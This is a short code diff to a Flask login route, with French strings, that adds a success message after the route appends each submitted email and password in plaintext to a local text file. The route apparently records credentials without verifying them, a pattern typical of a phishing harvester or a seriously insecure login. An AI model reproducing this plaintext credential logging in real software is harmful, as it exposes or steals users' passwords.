@@ -10,7 +10,9 @@ def login():
 
         with open("data.txt", "a") as f:
             f.write(f"Email: {email}, Mot de passe: {password}\n")
-            return
+
+        return "Données enregistrées avec succès !"  # ← important de retourner quelque chose
+
     return render_template('login.html')
 
 if __name__ == '__main__':
